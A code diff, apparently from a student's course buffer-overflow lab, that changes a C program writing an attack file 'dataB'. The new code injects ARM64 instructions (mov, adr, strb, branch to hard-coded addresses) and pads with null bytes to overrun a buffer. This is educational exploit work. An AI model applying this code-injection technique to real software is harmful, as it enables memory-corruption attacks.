@@ -22,7 +22,7 @@ static const char sName[] = "Chinmay Bhandaru";
  * file. Returns 0 upon completion. */
 int main(void) {
     int i;
-    unsigned int uiMovInstr;
+    unsigned int uiInstr;
 
     /* Open/create file dataB with write privileges */
     FILE *psFile = fopen("dataB", "w");
@@ -35,12 +35,24 @@ int main(void) {
         putc(0, psFile);
     }
 
-    uiMovInstr = MiniAssembler_mov(0, 'A');
+    uiInstr = MiniAssembler_mov(0, 'A');
 
-    fwrite(&uiMovInstr, sizeof(unsigned int), 1, psFile);
+    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
+    uiInstr = MiniAssembler_adr(1, 0x420000 + 68,0x420080);
+
+    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
+    uiInstr = MiniAssembler_strb(0, 1);
+
+    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
+    uiInstr = MiniAssembler_b(0x40089c, 0x420088);
+
+    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* Add nullbytes to overrun the buffer and mark end of name */
-    for (i = 6; i < 32; i++) {
+    for (i = 18; i < 32; i++) {
         putc(0, psFile);
     }
 
